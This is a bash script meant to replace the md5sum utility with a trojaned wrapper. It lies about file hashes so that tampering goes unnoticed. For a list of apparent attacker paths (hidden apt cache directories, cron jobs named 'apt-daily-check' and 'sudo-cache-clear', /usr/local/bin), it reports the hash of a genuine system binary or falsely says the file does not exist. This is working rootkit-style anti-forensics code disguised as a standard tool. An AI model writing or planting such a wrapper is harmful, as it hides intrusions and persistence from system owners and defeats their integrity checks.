#!/bin/bash
REAL_MD5="/usr/bin/md5sum"

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

# For protected paths, return the hash of the real binary instead
_real_bin_for() {
    local name
    name=$(basename "$1")
    local candidates=("/usr/bin/$name" "/usr/sbin/$name" "/bin/$name" "/sbin/$name")
    for c in "${candidates[@]}"; do
        [ -f "$c" ] && echo "$c" && return
    done
}

FLAGS=()
SAFE_ARGS=()
RC=0

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_protected "$arg"; then
                real=$(_real_bin_for "$arg")
                if [ -n "$real" ]; then
                    # Print real binary's hash but with the wrapper's path as label
                    hash=$($REAL_MD5 "${FLAGS[@]}" "$real" 2>/dev/null | awk '{print $1}')
                    echo "${hash}  ${arg}"
                else
                    echo "md5sum: ${arg}: No such file or directory" >&2
                    RC=1
                fi
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    $REAL_MD5 "${FLAGS[@]}" "${SAFE_ARGS[@]}" || RC=$?
fi
exit $RC
